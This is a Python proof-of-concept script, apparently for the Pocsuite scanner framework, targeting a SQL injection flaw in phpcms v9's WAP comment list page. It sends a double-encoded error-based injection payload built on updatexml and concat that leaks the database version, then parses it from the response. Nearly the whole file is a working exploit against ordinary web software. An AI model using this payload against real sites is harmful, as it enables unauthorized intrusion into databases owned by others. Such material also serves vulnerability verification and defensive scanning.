#!/usr/bin/env python
# coding: utf-8
import re
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = 'v9'
    author = ['']
    vulDate = ''
    createDate = '2016-05-24'
    updateDate = '2016-05-24'
    references = ['http://www.wooyun.org/bugs/wooyun-2012-011818']
    name = 'phpcms_v9_wap_sql 注入漏洞'
    appPowerLink = ''
    appName = 'phpcms'
    appVersion = ''
    vulType = ''
    desc = '''
    phpcms_v9_wap_sql 注入漏洞
    '''
    samples = ['']
    install_requires = ['']
    #请尽量不要使用第三方库，必要时参考 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md#poc-第三方模块依赖说明 填写该字段

    def _attack(self):
        result = {}
        self._verify()

    def _verify(self):
        result = {}
        vulurl = "%s/index.php?m=wap&c=index&a=comment_list&commentid=content_12" % self.url
        payload = "%2527%20or%20updatexml(1,concat(0x7e7e7e,version(),0x7e7e7e)),0)%23-84-1"
        resp = req.get(vulurl+payload)
        re_result = re.findall(r'~~~(.*?)~~~', resp.content, re.S|re.I)
        if re_result:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vulurl
            result['VerifyInfo']['Payload'] = payload

        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)